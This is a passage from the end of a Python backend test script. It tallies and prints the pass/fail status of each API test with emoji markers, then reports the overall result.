    for test_name, result in test_results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"   {test_name}: {status}")
        if result:
            passed += 1
    
    print(f"\n🎯 Overall Result: {passed}/{total} tests passed")
    
    if passed == total:
        print("🎉 All backend tests PASSED! The API is working correctly.")
        return True
    else:
        print("⚠️  Some tests FAILED. Check the details above.")
        return False

if __name__ == "__main__":
    main()